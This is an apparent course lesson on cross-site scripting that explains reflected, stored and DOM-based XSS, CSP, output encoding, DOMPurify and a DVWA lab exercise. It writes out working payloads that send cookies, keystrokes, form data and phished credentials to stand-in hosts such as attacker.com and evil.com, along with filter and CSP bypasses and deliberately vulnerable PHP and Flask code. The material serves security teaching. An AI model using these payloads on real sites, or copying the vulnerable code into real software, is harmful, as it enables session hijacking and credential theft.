# Cross-Site Scripting (XSS) Fundamentals

## Injecting Code Into the Browser

---

## What is XSS?

`Cross-Site Scripting` (`XSS`) occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim's browser.

![what_is_xss](/svg/courses/security/web-application-hacking/13_xss_fundamentals/what_is_xss.svg)

---

## XSS Types

| Type | Storage | Trigger | Severity |
|------|---------|---------|----------|
| **Reflected** | Not stored | URL parameter | Medium-High |
| **Stored** | Database | Page load | High-Critical |
| **DOM-based** | Client-side | URL/client input | Medium-High |

---

## Reflected XSS

```misc
Attack flow:
1. Attacker crafts URL with malicious script:
   https://target.com/search?q=<script>alert('XSS')</script>

2. Attacker tricks victim into clicking the link
   (via email, chat, social media)

3. Server includes the search term in the response:
   <p>Results for: <script>alert('XSS')</script></p>

4. Victim's browser executes the script
   The script runs with the victim's session!
```

---

## Reflected XSS - Code Example

```php
<!-- VULNERABLE PHP code -->
<?php
  $search = $_GET['q'];
  echo "<h2>Search results for: " . $search . "</h2>";
?>

<!-- Normal request -->
GET /search?q=shoes
Response: <h2>Search results for: shoes</h2>

<!-- Attack request -->
GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
Response: <h2>Search results for: <script>document.location='https://evil.com/?c='+document.cookie</script></h2>

<!-- SECURE PHP code -->
<?php
  $search = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
  echo "<h2>Search results for: " . $search . "</h2>";
?>
```

---

## Stored XSS

```misc
Attack flow:
1. Attacker posts malicious content:
   Comment: "Great product! <script>steal_cookies()</script>"

2. Server stores comment in database

3. When ANY user views the comments page:
   Server retrieves comment from DB
   Includes it in HTML without escaping

4. Script executes in EVERY visitor's browser
   Potentially affecting thousands of users!
```

---

## Stored XSS - Code Example

```python
# VULNERABLE: Stored XSS in blog comments
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    # Stored directly in database without sanitization
    db.execute("INSERT INTO comments (text) VALUES (?)", (comment,))
    return redirect('/post/1')

@app.route('/post/<id>')
def show_post(id):
    comments = db.execute("SELECT text FROM comments WHERE post_id=?", (id,))
    html = ""
    for c in comments:
        html += f"<div class='comment'>{c['text']}</div>"  # VULNERABLE!
    return render_template('post.html', comments_html=html)

# SECURE: Use template auto-escaping
# In Jinja2 template:
# {{ comment.text }}  <- Auto-escaped by default
# {{ comment.text | safe }}  <- DANGEROUS, bypasses escaping
```

---

## DOM-Based XSS

```javascript
// DOM XSS - vulnerability is entirely in client-side code
// The server never sees the malicious payload

// VULNERABLE: Using URL hash in innerHTML
// URL: https://target.com/page#<img src=x onerror=alert(1)>
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// VULNERABLE: Using URL parameters
// URL: https://target.com/page?name=<script>alert(1)</script>
var name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

// SECURE: Use textContent instead of innerHTML
document.getElementById('output').textContent = userInput;
```

---

## DOM XSS Sources and Sinks

```misc
Sources (where attacker input enters):
  document.URL
  document.documentURI
  location.href / .search / .hash / .pathname
  document.referrer
  window.name
  postMessage data
  Web Storage (localStorage, sessionStorage)

Sinks (where input becomes dangerous):
  element.innerHTML
  element.outerHTML
  document.write()
  document.writeln()
  eval()
  setTimeout(string)
  setInterval(string)
  Function(string)
  element.setAttribute('onclick', ...)
  location.href = ...
  jQuery.html()
  $.append()
```

---

## XSS Payloads - Basic

```html
<!-- Script tag -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<video src=x onerror=alert('XSS')>

<!-- href with javascript: protocol -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- In attributes -->
" onmouseover="alert('XSS')
' onfocus='alert(1)' autofocus='

<!-- Breaking out of script context -->
</script><script>alert('XSS')</script>
```

---

## XSS Payloads - Cookie Theft

```javascript
// Steal cookies and send to attacker
<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>

// Using fetch (stealthier)
<script>
fetch('https://attacker.com/steal',{
  method:'POST',
  body:document.cookie
});
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  new Image().src='https://attacker.com/log?k='+e.key;
});
</script>

// Redirect to phishing page
<script>
location='https://evil-login.com/fake-target-login';
</script>
```

---

## XSS Payloads - Session Hijacking

```javascript
// Full session hijacking attack
<script>
(function() {
    // Collect all cookies
    var cookies = document.cookie;

    // Collect page content
    var page = document.body.innerHTML;

    // Collect form data
    var forms = document.querySelectorAll('form');
    var formData = [];
    forms.forEach(function(f) {
        formData.push(f.action + ': ' + f.innerHTML);
    });

    // Send to attacker
    var data = btoa(JSON.stringify({
        cookies: cookies,
        url: location.href,
        forms: formData
    }));

    new Image().src = 'https://attacker.com/c?d=' + data;
})();
</script>
```

---

## XSS Payloads - Defacement and Phishing

```javascript
// Deface the page
<script>
document.body.innerHTML = '<h1>Hacked by XSS</h1>';
</script>

// Inject fake login form (phishing)
<script>
document.body.innerHTML = `
<div style="text-align:center;margin-top:100px">
  <h2>Session Expired - Please Log In Again</h2>
  <form action="https://attacker.com/phish" method="POST">
    <input name="username" placeholder="Username"><br><br>
    <input name="password" type="password" placeholder="Password"><br><br>
    <button type="submit">Login</button>
  </form>
</div>
`;
</script>

// This creates a convincing login page on the REAL domain
// Victim sees target.com in address bar - trusts it
```

---

## XSS Delivery Mechanisms

```misc
1. Reflected XSS via URL:
   https://target.com/search?q=<script>evil()</script>
   - Sent via email, chat, social media
   - URL shorteners hide the malicious payload

2. Stored XSS via user content:
   - Forum posts, comments, profile fields
   - Product reviews, support tickets
   - File names, image alt text
   - Email subjects/bodies (webmail)

3. DOM XSS via client-side:
   - URL fragment (#payload)
   - PostMessage from another window
   - Web Storage manipulation

4. Via intermediary:
   - Malicious ads (malvertising)
   - Compromised CDN scripts
   - Man-in-the-middle injection
```

---

## Finding XSS - Manual Testing

```misc
Step 1: Identify all reflection points
  Enter: unique_string_12345
  Search page source for this string
  Note the HTML context where it appears

Step 2: Determine the context
  a) Inside HTML tags:    <p>USER_INPUT</p>
  b) Inside attributes:  <input value="USER_INPUT">
  c) Inside JavaScript:  var x = "USER_INPUT";
  d) Inside URLs:        <a href="USER_INPUT">
  e) Inside CSS:         style="color:USER_INPUT"

Step 3: Craft context-appropriate payload
  a) <script>alert(1)</script>
  b) " onmouseover="alert(1)
  c) ";alert(1);//
  d) javascript:alert(1)
  e) ;background:url(javascript:alert(1))
```

---

## XSS Context Breakouts

```html
<!-- Context: Inside a tag attribute -->
<input value="USER_INPUT">
Payload: " onfocus="alert(1)" autofocus="
Result:  <input value="" onfocus="alert(1)" autofocus="">

<!-- Context: Inside a script block -->
<script>var name = "USER_INPUT";</script>
Payload: ";alert(1);//
Result:  <script>var name = "";alert(1);//";</script>

<!-- Context: Inside a comment -->
<!-- USER_INPUT -->
Payload: --><script>alert(1)</script><!--
Result:  <!-- --><script>alert(1)</script><!-- -->

<!-- Context: Inside a textarea -->
<textarea>USER_INPUT</textarea>
Payload: </textarea><script>alert(1)</script>
Result:  <textarea></textarea><script>alert(1)</script>
```

---

## XSS Filter Bypass Techniques

```html
<!-- Filter: strips <script> tags -->
<scr<script>ipt>alert(1)</script>  <!-- Recursive removal -->
<ScRiPt>alert(1)</ScRiPt>          <!-- Case variation -->
<script/src="data:,alert(1)">     <!-- Alternative syntax -->

<!-- Filter: blocks 'alert' -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>window['al'+'ert'](1)</script>

<!-- Filter: blocks 'javascript:' -->
<a href="&#106;avascript:alert(1)">  <!-- HTML entities -->
<a href="jAvAsCrIpT:alert(1)">       <!-- Case variation -->

<!-- Filter: blocks event handlers -->
<svg/onload=alert(1)>                <!-- No spaces needed -->
<img src=x oNeRrOr=alert(1)>        <!-- Case variation -->

<!-- Filter: blocks parentheses -->
<script>alert`1`</script>            <!-- Template literals -->
<script>onerror=alert;throw 1</script>
```

---

## Encoding-Based Bypasses

```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- HTML entity encoding -->
&lt;script&gt;  (won't work - browser decodes THEN parses)
But IN attributes:
<a href="javascript:alert(1)">     <!-- Works! -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">

<!-- Unicode encoding (in JavaScript context) -->
<script>\u0061lert(1)</script>

<!-- Hex encoding -->
<script>\x61lert(1)</script>

<!-- Octal encoding -->
<script>\141lert(1)</script>

<!-- Base64 in data URI -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## XSS in Modern Frameworks

```javascript
// React - safe by default
const name = "<script>alert(1)</script>";
return <div>{name}</div>;  // Escaped, renders as text

// BUT dangerouslySetInnerHTML is dangerous
return <div dangerouslySetInnerHTML={{__html: userInput}} />;

// Angular - safe by default
// {{ userInput }}  is auto-escaped
// BUT [innerHTML]="userInput" can be dangerous
// Angular sanitizes HTML but some bypasses exist

// Vue.js
// {{ userInput }}  is auto-escaped
// BUT v-html="userInput" is dangerous:
// <div v-html="userInput"></div>

// Key takeaway: Frameworks help, but developers
// can still introduce XSS through unsafe APIs
```

---

## Content Security Policy (CSP)

```http
# CSP is a browser-enforced security policy
# It controls which resources can load and execute

# Basic CSP header
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self' https://api.target.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';

# Strict CSP with nonces
Content-Security-Policy:
    script-src 'nonce-random123' 'strict-dynamic';

# In HTML:
<script nonce="random123">
    // This script will execute
</script>
<script>alert('blocked')</script>  <!-- Blocked by CSP -->
```

---

## XSS Prevention - Output Encoding

```python
# Rule 1: HTML encode for HTML body context
import html
safe = html.escape(user_input)
# < becomes &lt;  > becomes &gt;  & becomes &amp;

# Rule 2: Attribute encode for HTML attributes
# Use html.escape() AND always quote attributes
f'<input value="{html.escape(user_input)}">'

# Rule 3: JavaScript encode for JS context
import json
safe_js = json.dumps(user_input)
# Properly escapes for JavaScript string context

# Rule 4: URL encode for URL context
from urllib.parse import quote
safe_url = quote(user_input)

# Rule 5: CSS encode for CSS context
# Avoid inserting user input into CSS entirely
```

---

## XSS Prevention - Complete Strategy

```misc
1. Output Encoding (primary defense)
   - Context-aware encoding at point of output
   - Use framework auto-escaping features

2. Input Validation (secondary defense)
   - Whitelist acceptable input patterns
   - Reject or sanitize unexpected input

3. Content Security Policy
   - Restrict script execution to trusted sources
   - Use nonces or hashes for inline scripts

4. HTTPOnly Cookies
   - Prevent JavaScript access to session cookies

5. Sanitization Libraries
   - DOMPurify for HTML sanitization
   - Bleach (Python), sanitize-html (Node.js)

6. X-XSS-Protection Header (legacy)
   - Modern browsers: use CSP instead
```

---

## DOMPurify - Safe HTML Sanitization

```javascript
// DOMPurify removes dangerous HTML while keeping safe content

// Install: npm install dompurify

import DOMPurify from 'dompurify';

// Basic usage
let dirty = '<p>Hello</p><script>alert("XSS")</script>';
let clean = DOMPurify.sanitize(dirty);
// Result: '<p>Hello</p>'

// Allow specific tags
let clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title']
});

// For React
import { JSDOM } from 'jsdom';
const window = new JSDOM('').window;
const purify = DOMPurify(window);
const clean = purify.sanitize(dirty);
```

---

## CSP Bypass Techniques

```javascript
// If CSP allows 'unsafe-inline':
// Any inline script executes - CSP is ineffective for XSS

// If CSP allows a CDN that hosts user content:
// script-src 'self' https://cdn.example.com
// Upload malicious JS to the CDN, then:
<script src="https://cdn.example.com/uploads/evil.js"></script>

// If CSP allows *.googleapis.com:
// Use Google's JSONP endpoints:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

// If CSP uses 'strict-dynamic' but no nonce:
// Base tag injection to redirect relative script loads:
<base href="https://evil.com/">
// Scripts with relative src will load from evil.com

// CSP Evaluator tool:
// https://csp-evaluator.withgoogle.com/
// Analyzes CSP headers for weaknesses
```

---

## XSS via Mutation (mXSS)

```html
<!-- Mutation XSS exploits browser HTML parsing quirks -->

<!-- The browser "fixes" invalid HTML in unexpected ways -->
<!-- Input that appears safe after server-side sanitization -->
<!-- may become dangerous after browser mutation -->

<!-- Example: This looks harmless: -->
<p id="test"><noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After browser mutation, noscript content is parsed -->
<!-- differently and the img tag becomes active -->

<!-- Another example with SVG namespace confusion: -->
<svg><![CDATA[><img src=x onerror=alert(1)>]]>

<!-- Defense: -->
<!-- 1. Sanitize on the SERVER side -->
<!-- 2. Also sanitize on the CLIENT side (DOMPurify) -->
<!-- 3. Use CSP as additional layer -->
<!-- 4. Prefer textContent over innerHTML -->
```

---

## XSS Automated Tools

```bash
# XSStrike - Advanced XSS detection
python3 xsstrike.py -u "http://target.com/search?q=test"

# XSStrike with form
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# Dalfox - Parameter analysis and XSS scanning
dalfox url "http://target.com/search?q=test"

# With pipe from other tools
cat urls.txt | dalfox pipe

# Burp Suite Scanner (Pro)
# Automatically detects reflected, stored, and DOM XSS

# Browser-based testing with XSS Hunter
# Deploy XSS Hunter to capture blind XSS callbacks
# Payload: "><script src=https://yourxsshunter.com/probe.js></script>
# Captures: cookies, URL, DOM, screenshot when triggered
```

---

## Blind XSS

```javascript
// Blind XSS: Payload triggers in a different context
// than where it was submitted (e.g., admin panel)

// Scenario: Support ticket system
// User submits ticket with XSS payload
// Admin views ticket in admin panel -> payload fires

// Detection: Use an out-of-band callback
// XSS Hunter or custom callback server

// Payload:
"><script src=https://your-callback-server.com/probe.js></script>

// Common blind XSS injection points:
// - Support tickets / contact forms
// - User-Agent header (logged in admin dashboards)
// - Referer header
// - Order notes / comments
// - Error reports
// - Analytics dashboards

// Your callback server logs:
// - IP address of the browser
// - Cookies (if not HttpOnly)
// - Full DOM / page HTML
// - Screenshot of the page
```

---

## XSS Impact - Real-World Consequences

```misc
XSS attacks can achieve:

1. Session Hijacking
   - Steal HttpOnly=false cookies
   - Impersonate any user who triggers the XSS

2. Credential Theft
   - Inject fake login form (phishing)
   - Capture keystrokes with keylogger
   - Read autofilled credentials from DOM

3. Malware Distribution
   - Redirect to exploit kits
   - Drive-by downloads
   - Cryptomining in background

4. Worm Propagation
   - Self-replicating XSS (Samy worm, 2005)
   - Each infected user spreads to their contacts
   - MySpace Samy worm: 1M infected in 20 hours

5. Internal Network Scanning
   - JavaScript can probe internal IPs
   - Discover internal services via error timing
   - Launch attacks against internal systems
```

---

## XSS Testing Methodology Summary

```misc
For each input field / parameter:

1. IDENTIFY the reflection point
   Input: unique_test_string_7x7
   Find it in the response

2. DETERMINE the context
   HTML body? Attribute? JavaScript? URL?

3. TEST basic payloads
   <script>alert(1)</script>
   "><img src=x onerror=alert(1)>
   '-alert(1)-'

4. ANALYZE filtering
   What characters are blocked?
   What keywords are stripped?
   Is encoding applied?

5. BYPASS filters
   Case variation, encoding, alternative tags
   Event handlers, protocol handlers

6. VERIFY impact
   Can cookies be accessed?
   Can actions be performed?
   Is it reflected or stored?

7. DOCUMENT
   Full request/response
   Working payload
   Impact assessment
```

---

## Lab: DVWA XSS Exercises

```misc
Reflected XSS (Low):
  URL: /vulnerabilities/xss_r/?name=<script>alert('XSS')</script>

Stored XSS (Low):
  Name: test
  Message: <script>alert('XSS')</script>

DOM XSS (Low):
  URL: /vulnerabilities/xss_d/?default=<script>alert('XSS')</script>

Tasks:
1. Exploit all three XSS types at Low level
2. Try Medium level (observe filtering)
3. Bypass Medium level filters
4. Attempt High level bypasses
5. Review Impossible level code (proper defense)
```

---

## Summary

- `XSS` lets attackers execute code in victims' browsers
- Three types: Reflected, Stored, and DOM-based
- Stored XSS is the most dangerous (affects all visitors)
- Context determines the correct payload and encoding
- Modern frameworks auto-escape but have dangerous escape hatches
- `CSP` is a powerful defense layer
- Output encoding at the point of rendering is the primary defense
- Use `DOMPurify` for any required HTML rendering

> Tomorrow: Back-End Attacks & Application Logic
